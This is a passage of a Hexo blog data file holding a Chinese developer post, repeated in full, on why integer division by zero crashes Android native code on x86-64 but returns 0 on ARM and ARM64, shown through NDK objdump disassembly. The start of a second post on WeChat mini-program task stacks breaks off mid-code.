class=\"comment\">/* this */</span>)</span> </span>&#123;</span><br><span class=\"line\"><span class=\"comment\">//    int x = 10;</span></span><br><span class=\"line\"><span class=\"comment\">//    int y = x / 0;</span></span><br><span class=\"line\"><span class=\"comment\">//    LOGD(&quot;crash %d&quot;, y);</span></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"string\">&quot;Crash!!!&quot;</span>; <span class=\"comment\">// 手动抛异常</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还好没有毁三观，App顺利地crash了，所以异常机制是正常的。<br>那么就说明除0操作在我的手机上没有导致异常抛出，唯一能想到的就是<strong>汇编指令不同了</strong>，毕竟电脑CPU是x86-64架构的，手机是arm的，二者指令集不同。<br><strong>验证方法当然就是利用NDK工具和so文件生成汇编代码，看看是不是arm架构下根本就不用除法指令。</strong><br>1、先build一下Android工程，然后找到so文件：<br><img src=\"https://imgconvert.csdnimg.cn/20190412233052125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以把它们暂时拷贝出来待用。<br>2、进入NDK工具链目录（前提是在SDK Manager中下载了NDK相关的工具），下面是Linux终端命令操作：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cd</span> Android/Sdk/ndk-bundle/toolchains/</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">ls</span></span></span><br><span class=\"line\">aarch64-linux-android-4.9  arm-linux-androideabi-4.9  llvm  renderscript  x86-4.9  x86_64-4.9</span><br></pre></td></tr></table></figure>\n\n<p>可以发现toolchains下面有4种架构的工具包，对于build出来的4个so文件，这里我们只测试x86-64和arm的。<br>3、以前者为例，于是进入相关目录，找到xxx-linux-android-objdump工具，然后生成汇编指令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cd</span> x86_64-4.9/prebuilt/linux-x86_64/bin</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">./x86_64-linux-android-objdump -dx libnative-lib.so &gt; test.txt</span></span><br></pre></td></tr></table></figure>\n\n<p>这里我已经把刚才的so文件拷贝到工具同目录了，所以命令才能直接这么写。<br>4、其它架构的操作和上述几步一致，但一定要对应解析正确的so文件，不然objdump会提示错误。<br>5、打开刚才生成的汇编txt文本，搜索我们最开始写的那个test_crash方法，发现在x86-64架构中：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0000000000013960</span> &lt;test_crash&gt;:</span><br><span class=\"line\">   <span class=\"number\">13960</span>:\t<span class=\"number\">55</span>                   \tpush   %rbp</span><br><span class=\"line\">   <span class=\"number\">13961</span>:\t<span class=\"number\">48</span> <span class=\"number\">89</span> e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">   <span class=\"number\">13964</span>:\t<span class=\"number\">31</span> c0                \txor    %eax,%eax</span><br><span class=\"line\">   <span class=\"number\">13966</span>:\tc7 <span class=\"number\">45</span> fc <span class=\"number\">0</span>a <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> \tmovl   $<span class=\"number\">0xa</span>,<span class=\"number\">-0x4</span>(%rbp)</span><br><span class=\"line\">   <span class=\"number\">1396</span>d:\t<span class=\"number\">8b</span> <span class=\"number\">4</span>d fc             \tmov    <span class=\"number\">-0x4</span>(%rbp),%ecx</span><br><span class=\"line\">   <span class=\"number\">13970</span>:\t<span class=\"number\">89</span> <span class=\"number\">45</span> f4             \tmov    %eax,<span class=\"number\">-0xc</span>(%rbp)</span><br><span class=\"line\">   <span class=\"number\">13973</span>:\t<span class=\"number\">89</span> c8                \tmov    %ecx,%eax</span><br><span class=\"line\">   <span class=\"number\">13975</span>:\t<span class=\"number\">99</span>                   \tcltd   </span><br><span class=\"line\">   <span class=\"number\">13976</span>:\t<span class=\"number\">8b</span> <span class=\"number\">4</span>d f4             \tmov    <span class=\"number\">-0xc</span>(%rbp),%ecx</span><br><span class=\"line\">   <span class=\"number\">13979</span>:\tf7 f9                \tidiv   %ecx <span class=\"comment\">// idiv表示有符号数除法</span></span><br><span class=\"line\">   <span class=\"number\">1397b</span>:\t<span class=\"number\">89</span> <span class=\"number\">45</span> f8             \tmov    %eax,<span class=\"number\">-0x8</span>(%rbp)</span><br><span class=\"line\">   <span class=\"number\">1397</span>e:\t<span class=\"number\">5</span>d                   \tpop    %rbp</span><br><span class=\"line\">   <span class=\"number\">1397f</span>:\tc3                   \tretq  </span><br></pre></td></tr></table></figure>\n\n<p>然鹅，在arm的汇编指令中：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0000</span>cb1c &lt;test_crash&gt;:</span><br><span class=\"line\">    cb1c:\tb082      \tsub\tsp, #<span class=\"number\">8</span></span><br><span class=\"line\">    cb1e:\t<span class=\"number\">200</span>a      \tmovs\tr0, #<span class=\"number\">10</span></span><br><span class=\"line\">    cb20:\t<span class=\"number\">9001</span>      \tstr\tr0, [sp, #<span class=\"number\">4</span>]</span><br><span class=\"line\">    cb22:\tb002      \tadd\tsp, #<span class=\"number\">8</span></span><br><span class=\"line\">    cb24:\t<span class=\"number\">4770</span>      \tbx\tlr</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure>\n\n<p>发现没有div相关的指令，看来果然是不一样啊。<br>如果真是如此，那么x86-64架构的Android手机，肯定就会出现除0错误，于是我打开了一个x86-64的谷歌亲儿子模拟器，运行程序，还真崩掉了，但在arm架构的机器上，就不会崩。我手机是高通的CPU，正好也就是arm架构的。<br>这么说来，还真是印证了复杂指令集和精简指令集啊哈哈，你看看上面同样的代码实现，指令数却完全不同。</p>\n<p>后来，去Goggle一查，才发现arm体系结构本身就不包含除法运算硬件，是靠函数实现的，看来是我孤陋寡闻了：<br><a href=\"https://blog.csdn.net/weixin_33851429/article/details/91954260\">GCC ARM cortex-m0 除0问题</a><br><a href=\"https://blog.csdn.net/xhhjin/article/details/6338766\">ARM的除法运算优化策略</a><br><a href=\"https://www.eefocus.com/embedded/m/323206\">高效的C编程之：除法运算</a></p>\n<p>还没完，上面解释的只是arm架构，还有arm64呢（目前主流的骁龙845&#x2F;855等等都是）？先看看汇编指令：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000000131b</span>8 &lt;test_crash&gt;:</span><br><span class=\"line\">   <span class=\"number\">131b</span>8:\td10043ff \tsub\tsp, sp, #<span class=\"number\">0x10</span></span><br><span class=\"line\">   <span class=\"number\">131b</span>c:\t<span class=\"number\">52800148</span> \tmov\tw8, #<span class=\"number\">0xa</span>                   \t<span class=\"comment\">// #10</span></span><br><span class=\"line\">   <span class=\"number\">131</span>c0:\t<span class=\"number\">52800009</span> \tmov\tw9, #<span class=\"number\">0x0</span>                   \t<span class=\"comment\">// #0</span></span><br><span class=\"line\">   <span class=\"number\">131</span>c4:\tb9000fe8 \tstr\tw8, [sp,#<span class=\"number\">12</span>]</span><br><span class=\"line\">   <span class=\"number\">131</span>c8:\tb9400fe8 \tldr\tw8, [sp,#<span class=\"number\">12</span>]</span><br><span class=\"line\">   <span class=\"number\">131</span>cc:\t<span class=\"number\">1</span>ac90d08 \tsdiv\tw8, w8, w9 <span class=\"comment\">// sdiv表示有符号数除法</span></span><br><span class=\"line\">   <span class=\"number\">131</span>d0:\tb9000be8 \tstr\tw8, [sp,#<span class=\"number\">8</span>]</span><br><span class=\"line\">   <span class=\"number\">131</span>d4:\t<span class=\"number\">910043f</span>f \tadd\tsp, sp, #<span class=\"number\">0x10</span></span><br><span class=\"line\">   <span class=\"number\">131</span>d8:\td65f03c0 \tret</span><br></pre></td></tr></table></figure>\n\n<p>咦？怎么arm64架构又有除法指令（<a href=\"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0802a/SDIV.html\">sdiv指令文档</a>）了？那怎么除以0也不造成崩溃呢？<br>看了看arm官方的文档之后：<br><img src=\"https://imgconvert.csdnimg.cn/201904151552175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以发现，指令有一个标志位DZ，叫<strong>Divide by Zero fault enable bit</strong>，默认为0，即当除以0时不带出异常，而是返回0（这就解释了我们最开始为什么打log值是0），如果设为1，才会抛异常。</p>\n<p>此外，在<a href=\"http://infocenter.arm.com/help/topic/com.arm.doc.ihi0043d/IHI0043D_rtabi.pdf\">ARM 架构的运行时 ABI</a>文档中，也看到了类似的解释，说明除0抛不抛异常，取决于函数的不同实现：<br><img src=\"https://imgconvert.csdnimg.cn/20190419160717355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<hr>\n<p>哦对，要查看自己手机的CPU信息，可以用adb命令哦：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell cat /proc/cpuinfo</span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>我们都知道不管是在Java还是在C++程序中，下面这段代码都会导致程序错误：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">x</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">y</span> <span class=\"operator\">=</span> x / <span class=\"number\">0</span>;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>但是我今天发现了一个比较神奇的事情，把这段代码写成native方法后在Java层调用，竟然没有导致App崩溃，代码是这样子的：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;jni.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;logger.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">JNIEXPORT <span class=\"type\">void</span> JNICALL <span class=\"title\">test_crash</span><span class=\"params\">(JNIEnv *env, jobject <span class=\"comment\">/* this */</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> y = x / <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">LOGD</span>(<span class=\"string\">&quot;crash %d&quot;</span>, y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n\n<p>Java层很简单，我保证没有try-catch，而且Log打印出来y的值竟然是0，这完全颠覆我三观。<br>怀疑人生的我把这两行关键代码放到原生的C++编译器中编译并运行，妥妥地报错：<br><img src=\"https://imgconvert.csdnimg.cn/20190412232026342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>为什么在Android手机上就不会导致crash呢？于是我验证了一下是不是异常机制有什么问题，直接这样写native代码：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">JNIEXPORT <span class=\"type\">void</span> JNICALL <span class=\"title\">test_crash</span><span class=\"params\">(JNIEnv *env, jobject <span class=\"comment\">/* this */</span>)</span> </span>&#123;</span><br><span class=\"line\"><span class=\"comment\">//    int x = 10;</span></span><br><span class=\"line\"><span class=\"comment\">//    int y = x / 0;</span></span><br><span class=\"line\"><span class=\"comment\">//    LOGD(&quot;crash %d&quot;, y);</span></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"string\">&quot;Crash!!!&quot;</span>; <span class=\"comment\">// 手动抛异常</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还好没有毁三观，App顺利地crash了，所以异常机制是正常的。<br>那么就说明除0操作在我的手机上没有导致异常抛出，唯一能想到的就是<strong>汇编指令不同了</strong>，毕竟电脑CPU是x86-64架构的，手机是arm的，二者指令集不同。<br><strong>验证方法当然就是利用NDK工具和so文件生成汇编代码，看看是不是arm架构下根本就不用除法指令。</strong><br>1、先build一下Android工程，然后找到so文件：<br><img src=\"https://imgconvert.csdnimg.cn/20190412233052125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以把它们暂时拷贝出来待用。<br>2、进入NDK工具链目录（前提是在SDK Manager中下载了NDK相关的工具），下面是Linux终端命令操作：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cd</span> Android/Sdk/ndk-bundle/toolchains/</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">ls</span></span></span><br><span class=\"line\">aarch64-linux-android-4.9  arm-linux-androideabi-4.9  llvm  renderscript  x86-4.9  x86_64-4.9</span><br></pre></td></tr></table></figure>\n\n<p>可以发现toolchains下面有4种架构的工具包，对于build出来的4个so文件，这里我们只测试x86-64和arm的。<br>3、以前者为例，于是进入相关目录，找到xxx-linux-android-objdump工具，然后生成汇编指令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\"><span class=\"built_in\">cd</span> x86_64-4.9/prebuilt/linux-x86_64/bin</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">./x86_64-linux-android-objdump -dx libnative-lib.so &gt; test.txt</span></span><br></pre></td></tr></table></figure>\n\n<p>这里我已经把刚才的so文件拷贝到工具同目录了，所以命令才能直接这么写。<br>4、其它架构的操作和上述几步一致，但一定要对应解析正确的so文件，不然objdump会提示错误。<br>5、打开刚才生成的汇编txt文本，搜索我们最开始写的那个test_crash方法，发现在x86-64架构中：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0000000000013960</span> &lt;test_crash&gt;:</span><br><span class=\"line\">   <span class=\"number\">13960</span>:\t<span class=\"number\">55</span>                   \tpush   %rbp</span><br><span class=\"line\">   <span class=\"number\">13961</span>:\t<span class=\"number\">48</span> <span class=\"number\">89</span> e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">   <span class=\"number\">13964</span>:\t<span class=\"number\">31</span> c0                \txor    %eax,%eax</span><br><span class=\"line\">   <span class=\"number\">13966</span>:\tc7 <span class=\"number\">45</span> fc <span class=\"number\">0</span>a <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> \tmovl   $<span class=\"number\">0xa</span>,<span class=\"number\">-0x4</span>(%rbp)</span><br><span class=\"line\">   <span class=\"number\">1396</span>d:\t<span class=\"number\">8b</span> <span class=\"number\">4</span>d fc             \tmov    <span class=\"number\">-0x4</span>(%rbp),%ecx</span><br><span class=\"line\">   <span class=\"number\">13970</span>:\t<span class=\"number\">89</span> <span class=\"number\">45</span> f4             \tmov    %eax,<span class=\"number\">-0xc</span>(%rbp)</span><br><span class=\"line\">   <span class=\"number\">13973</span>:\t<span class=\"number\">89</span> c8                \tmov    %ecx,%eax</span><br><span class=\"line\">   <span class=\"number\">13975</span>:\t<span class=\"number\">99</span>                   \tcltd   </span><br><span class=\"line\">   <span class=\"number\">13976</span>:\t<span class=\"number\">8b</span> <span class=\"number\">4</span>d f4             \tmov    <span class=\"number\">-0xc</span>(%rbp),%ecx</span><br><span class=\"line\">   <span class=\"number\">13979</span>:\tf7 f9                \tidiv   %ecx <span class=\"comment\">// idiv表示有符号数除法</span></span><br><span class=\"line\">   <span class=\"number\">1397b</span>:\t<span class=\"number\">89</span> <span class=\"number\">45</span> f8             \tmov    %eax,<span class=\"number\">-0x8</span>(%rbp)</span><br><span class=\"line\">   <span class=\"number\">1397</span>e:\t<span class=\"number\">5</span>d                   \tpop    %rbp</span><br><span class=\"line\">   <span class=\"number\">1397f</span>:\tc3                   \tretq  </span><br></pre></td></tr></table></figure>\n\n<p>然鹅，在arm的汇编指令中：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0000</span>cb1c &lt;test_crash&gt;:</span><br><span class=\"line\">    cb1c:\tb082      \tsub\tsp, #<span class=\"number\">8</span></span><br><span class=\"line\">    cb1e:\t<span class=\"number\">200</span>a      \tmovs\tr0, #<span class=\"number\">10</span></span><br><span class=\"line\">    cb20:\t<span class=\"number\">9001</span>      \tstr\tr0, [sp, #<span class=\"number\">4</span>]</span><br><span class=\"line\">    cb22:\tb002      \tadd\tsp, #<span class=\"number\">8</span></span><br><span class=\"line\">    cb24:\t<span class=\"number\">4770</span>      \tbx\tlr</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure>\n\n<p>发现没有div相关的指令，看来果然是不一样啊。<br>如果真是如此，那么x86-64架构的Android手机，肯定就会出现除0错误，于是我打开了一个x86-64的谷歌亲儿子模拟器，运行程序，还真崩掉了，但在arm架构的机器上，就不会崩。我手机是高通的CPU，正好也就是arm架构的。<br>这么说来，还真是印证了复杂指令集和精简指令集啊哈哈，你看看上面同样的代码实现，指令数却完全不同。</p>\n<p>后来，去Goggle一查，才发现arm体系结构本身就不包含除法运算硬件，是靠函数实现的，看来是我孤陋寡闻了：<br><a href=\"https://blog.csdn.net/weixin_33851429/article/details/91954260\">GCC ARM cortex-m0 除0问题</a><br><a href=\"https://blog.csdn.net/xhhjin/article/details/6338766\">ARM的除法运算优化策略</a><br><a href=\"https://www.eefocus.com/embedded/m/323206\">高效的C编程之：除法运算</a></p>\n<p>还没完，上面解释的只是arm架构，还有arm64呢（目前主流的骁龙845&#x2F;855等等都是）？先看看汇编指令：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000000131b</span>8 &lt;test_crash&gt;:</span><br><span class=\"line\">   <span class=\"number\">131b</span>8:\td10043ff \tsub\tsp, sp, #<span class=\"number\">0x10</span></span><br><span class=\"line\">   <span class=\"number\">131b</span>c:\t<span class=\"number\">52800148</span> \tmov\tw8, #<span class=\"number\">0xa</span>                   \t<span class=\"comment\">// #10</span></span><br><span class=\"line\">   <span class=\"number\">131</span>c0:\t<span class=\"number\">52800009</span> \tmov\tw9, #<span class=\"number\">0x0</span>                   \t<span class=\"comment\">// #0</span></span><br><span class=\"line\">   <span class=\"number\">131</span>c4:\tb9000fe8 \tstr\tw8, [sp,#<span class=\"number\">12</span>]</span><br><span class=\"line\">   <span class=\"number\">131</span>c8:\tb9400fe8 \tldr\tw8, [sp,#<span class=\"number\">12</span>]</span><br><span class=\"line\">   <span class=\"number\">131</span>cc:\t<span class=\"number\">1</span>ac90d08 \tsdiv\tw8, w8, w9 <span class=\"comment\">// sdiv表示有符号数除法</span></span><br><span class=\"line\">   <span class=\"number\">131</span>d0:\tb9000be8 \tstr\tw8, [sp,#<span class=\"number\">8</span>]</span><br><span class=\"line\">   <span class=\"number\">131</span>d4:\t<span class=\"number\">910043f</span>f \tadd\tsp, sp, #<span class=\"number\">0x10</span></span><br><span class=\"line\">   <span class=\"number\">131</span>d8:\td65f03c0 \tret</span><br></pre></td></tr></table></figure>\n\n<p>咦？怎么arm64架构又有除法指令（<a href=\"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0802a/SDIV.html\">sdiv指令文档</a>）了？那怎么除以0也不造成崩溃呢？<br>看了看arm官方的文档之后：<br><img src=\"https://imgconvert.csdnimg.cn/201904151552175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>可以发现，指令有一个标志位DZ，叫<strong>Divide by Zero fault enable bit</strong>，默认为0，即当除以0时不带出异常，而是返回0（这就解释了我们最开始为什么打log值是0），如果设为1，才会抛异常。</p>\n<p>此外，在<a href=\"http://infocenter.arm.com/help/topic/com.arm.doc.ihi0043d/IHI0043D_rtabi.pdf\">ARM 架构的运行时 ABI</a>文档中，也看到了类似的解释，说明除0抛不抛异常，取决于函数的不同实现：<br><img src=\"https://imgconvert.csdnimg.cn/20190419160717355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<hr>\n<p>哦对，要查看自己手机的CPU信息，可以用adb命令哦：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb shell cat /proc/cpuinfo</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"微信小程序任务栈实现原理","subtitle":"探寻小程序的根基。","date":"2019-04-26T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 背景\n\n之前面试一些校招同学，聊到微信小程序是什么launchMode，其任务栈是如何实现的？很多同学只提到singleInstance，这是不合适的。\n今天我们就猜测并解析一下微信主程序与小程序的关系与大致实现，最后给出源码，可以给大家作一个简单参考。\n\n## 初探\n\n既然要研究微信，那么我们就先打开几个小程序，再用adb命令看看任务栈信息。\n在终端使用 `adb shell dumpsys activity activities` 命令后，可以找到最近任务列表的Activity信息：\n\n```\nRunning activities (most recent first):\n  TaskRecord{caccd90 #3239 A=.AppBrandUI3 U=0 StackId=1 sz=1}\n    Run #4: ActivityRecord{bb162b8 u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI3 t3239}\n  TaskRecord{d6c62d6 #3190 A=com.tencent.mm U=0 StackId=1 sz=1}\n    Run #3: ActivityRecord{7f2d805 u0 com.tencent.mm/.ui.LauncherUI t3190}\n  TaskRecord{34a386a #3238 A=.AppBrandUI2 U=0 StackId=1 sz=1}\n    Run #2: ActivityRecord{16cfede u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI2 t3238}\n  TaskRecord{7ade2d1 #3237 A=.AppBrandUI U=0 StackId=1 sz=1}\n    Run #1: ActivityRecord{ccfd8ae u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI t3237}\n  ...\n```\n\n可以发现这里的#3是微信主Activity，4、2、1都是我开的小程序，且位于不同的任务栈中，Activity名称都是AppBrandUI+数字的形式。\n然后再看看其他关键信息（这里我单独筛出来）：\n\n```\npackageName=com.tencent.mm processName=com.tencent.mm\ntaskAffinity=com.tencent.mm\n\npackageName=com.tencent.mm processName=com.tencent.mm:appbrand3\ntaskAffinity=.AppBrandUI3\n\npackageName=com.tencent.mm processName=com.tencent.mm:appbrand2\ntaskAffinity=.AppBrandUI2\n\npackageName=com.tencent.mm processName=com.tencent.mm:appbrand\ntaskAffinity=.AppBrandUI\n```\n\n很简单，和我们平时实现多进程差不多，说明是给Activity设置了process属性。\n\n## 思考\n\n转念一想，小程序那么多，难道这些不同后缀的Activity都写死在代码里吗？\n显然不能这么干，只能两种途径可以达成目的：\n\n- 不在Manifest里面静态注册Activity，使用类似Hook的方式动态创建进程和Activity\n- 动静结合，设计一个Activity池，在本地写死有限数量的Activity，通过复用的方式承载小程序\n\n对于第一种，我查阅了一些资料，理论上讲是可以做到的，涉及到NDK开发，需要我们对AMS的源码很熟悉，不走常规流程启动Activity，且小程序是多进程的，可能还需要手动fork进程。\n这种方式显然具有较大的风险，属于黑科技范畴，而且谷歌官方是不推荐的，微信作为十几亿用户的常驻App，几乎不太可能使用这一方案。\n\n那么只剩第二种了，预先在本地写死n个一样的Activity（当然也可以通过继承形式），同时在Manifest中注册好。\n然后打开一个小程序就占用一个Activity，当打开第n+1个小程序时，覆盖第1个小程序所在的Activity，这样就相当于第1个小程序被顶掉了。\n\n分析到此，就很明显了，如果真的是第二种方案，那么小程序就不能无限数量地打开咯？果断打开微信试了一下，果然，最多只能开5个！当你启动第6个小程序时，第1个就被销毁了。\n其实这也是符合我们上述预期的，每个小程序的进程不一样，taskAffinity也不一样，类名也不一样。原生API是不支持动态设置taskAffinity和进程名的。\n\n## 简单实现\n\n小程序所在的Activity：\n\n```java\npublic class SmallActivity extends AppCompatActivity {\n\n    public static class Small0 extends SmallActivity {}\n    public static class Small1 extends SmallActivity {}\n    public static class Small2 extends SmallActivity {}\n    public static class Small3 extends SmallActivity {}\n    public static class 